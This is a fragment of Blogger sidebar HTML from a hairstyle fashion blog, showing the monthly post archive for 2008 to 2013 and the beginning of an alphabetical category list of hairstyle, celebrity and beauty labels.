+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/10/'>
+October
+</a>
+<span class='post-count' dir='ltr'>(45)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/09/'>
+September
+</a>
+<span class='post-count' dir='ltr'>(51)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(5)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/07/'>
+July
+</a>
+<span class='post-count' dir='ltr'>(35)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/06/'>
+June
+</a>
+<span class='post-count' dir='ltr'>(13)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/05/'>
+May
+</a>
+<span class='post-count' dir='ltr'>(16)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/04/'>
+April
+</a>
+<span class='post-count' dir='ltr'>(26)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/03/'>
+March
+</a>
+<span class='post-count' dir='ltr'>(59)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/02/'>
+February
+</a>
+<span class='post-count' dir='ltr'>(24)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(35)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/'>
+2012
+</a>
+<span class='post-count' dir='ltr'>(149)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(10)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(29)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/10/'>
+October
+</a>
+<span class='post-count' dir='ltr'>(17)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/09/'>
+September
+</a>
+<span class='post-count' dir='ltr'>(21)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(26)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/07/'>
+July
+</a>
+<span class='post-count' dir='ltr'>(26)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/06/'>
+June
+</a>
+<span class='post-count' dir='ltr'>(11)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/05/'>
+May
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/04/'>
+April
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/03/'>
+March
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/02/'>
+February
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2012/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2011/'>
+2011
+</a>
+<span class='post-count' dir='ltr'>(55)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2011/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2011/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(6)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2011/10/'>
+October
+</a>
+<span class='post-count' dir='ltr'>(9)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2011/09/'>
+September
+</a>
+<span class='post-count' dir='ltr'>(9)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2011/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(4)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2011/07/'>
+July
+</a>
+<span class='post-count' dir='ltr'>(25)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2010/'>
+2010
+</a>
+<span class='post-count' dir='ltr'>(16)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2010/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(8)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2010/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2010/06/'>
+June
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2010/02/'>
+February
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2010/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2009/'>
+2009
+</a>
+<span class='post-count' dir='ltr'>(6)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2009/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2009/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2009/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2008/'>
+2008
+</a>
+<span class='post-count' dir='ltr'>(12)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2008/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2008/10/'>
+October
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2008/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2008/07/'>
+July
+</a>
+<span class='post-count' dir='ltr'>(4)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2008/06/'>
+June
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div class='clear'></div>
+</div>
+</div><div class='widget Label' data-version='1' id='Label1'>
+<h2>Categories</h2>
+<div class='widget-content list-label-widget-content'>
+<ul>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/%24500'>$500</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/16'>16</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/1920'>1920</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/1920%27s'>1920&#39;s</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/1930'>1930</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/1940'>1940</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/1950'>1950</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/20%27s'>20&#39;s</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/2013'>2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/2013%20hairstyles'>2013 hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/2014%20Hairstyles'>2014 Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/6%20common%20mistakes'>6 common mistakes</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Adam%20Lambert'>Adam Lambert</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/African%20American%20Curly%20Hairstyles%20Pictures'>African American Curly Hairstyles Pictures</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/African%20American%20Hairstyles%20for%20Women'>African American Hairstyles for Women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/african%20women%20summer%20hairstyle'>african women summer hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/ageing'>ageing</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Aishwarya%20Rai'>Aishwarya Rai</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Alana%20Curry'>Alana Curry</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Aleksa%20Palladino'>Aleksa Palladino</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Alessandra%20Ambrosio'>Alessandra Ambrosio</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Amanda'>Amanda</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/amanda%20bynes%20long%20hairstyle'>amanda bynes long hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/amazing'>amazing</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/angelina'>angelina</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/angelina%20jolie'>angelina jolie</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Angled%20Bob'>Angled Bob</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Anita%20Lattouf'>Anita Lattouf</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Anna%20Sui'>Anna Sui</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Anne%20Hathaway'>Anne Hathaway</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/annual'>annual</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/anti%20ageing'>anti ageing</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Argon%20Oil'>Argon Oil</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/ARIA'>ARIA</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/aria%20awards'>aria awards</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Asian'>Asian</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/autumn%20colours'>autumn colours</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Autumn%20Mooney'>Autumn Mooney</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Awards'>Awards</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Axel%20Whitehead'>Axel Whitehead</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Bacchus'>Bacchus</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/balding'>balding</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Balenciaga'>Balenciaga</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bang'>bang</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bangs'>bangs</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bangs%20and%20fringe%20hairstyle'>bangs and fringe hairstyle</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Bauer%20Media'>Bauer Media</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Baz%20Luhrmann'>Baz Luhrmann</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Beach'>Beach</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/beach%20hair'>beach hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Beard'>Beard</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Beards'>Beards</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/beautiful'>beautiful</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Beauty'>Beauty</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Beauty%20%20Pevonia'>Beauty  Pevonia</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Beauty%20The%20Geek'>Beauty The Geek</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bed%20hair'>bed hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Ben%20Affleck'>Ben Affleck</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Bendeguz'>Bendeguz</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/berry'>berry</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/beyonce'>beyonce</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Big%20Hair'>Big Hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Billboard%20Music%20Awards'>Billboard Music Awards</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/black'>black</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20African%20American%20Hairstyles'>Black African American Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Curly%20Hairstyles%20Pictures'>Black Curly Hairstyles Pictures</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Emo%20Hairstyles'>Black Emo Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Eyeshadow'>Black Eyeshadow</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Hair%20Afro%20Puffs'>Black Hair Afro Puffs</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Hair%20Short%20Cuts'>Black Hair Short Cuts</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Hair%20Short%20Styles%202013'>Black Hair Short Styles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Hairstyles'>Black Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Men%20Afro%20Hairstyles'>Black Men Afro Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20out'>Black out</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Short%20Curly%20Hairstyles%20Pictures'>Black Short Curly Hairstyles Pictures</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Short%20Hair%20Dos'>Black Short Hair Dos</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Black%20Short%20Hair%20Photos'>Black Short Hair Photos</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/black%20white'>black white</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/blonde'>blonde</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/blonde%20bombshell'>blonde bombshell</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/blonde%20hairstyles'>blonde hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/blonde%20hairstyles%202013'>blonde hairstyles 2013</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/blonde%20hairstyles%20for%20black%20women'>blonde hairstyles for black women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/blonde%20hairstyles%20for%20men'>blonde hairstyles for men</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/blonde%20hairstyles%20pinterest'>blonde hairstyles pinterest</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/blonde%20hairstyles%20tumblr'>blonde hairstyles tumblr</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Blonde%20Hairstyles%20with%20Bangs'>Blonde Hairstyles with Bangs</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/blow%20dry'>blow dry</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/blow%20out'>blow out</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Blue%20Eyes'>Blue Eyes</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Blue%20hair'>Blue hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bob'>bob</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Bob%20Haircuts'>Bob Haircuts</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bob%20hairstyle%20back'>bob hairstyle back</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/Bob%20Hairstyles'>Bob Hairstyles</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bob%20hairstyles%20for%20black%20women'>bob hairstyles for black women</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bob%20hairstyles%20for%20round%20faces'>bob hairstyles for round faces</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bob%20hairstyles%20for%20thin%20hair'>bob hairstyles for thin hair</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bob%20hairstyles%20pinterest'>bob hairstyles pinterest</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bob%20hairstyles%20tumblr'>bob hairstyles tumblr</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bob%20hairstyles%20with%20layers'>bob hairstyles with layers</a>
+</li>
+<li>
+<a dir='ltr' href='http://mediumhairstylefashion.blogspot.com/search/label/bohemian'>bohemian</a>
+</li>
+<li>
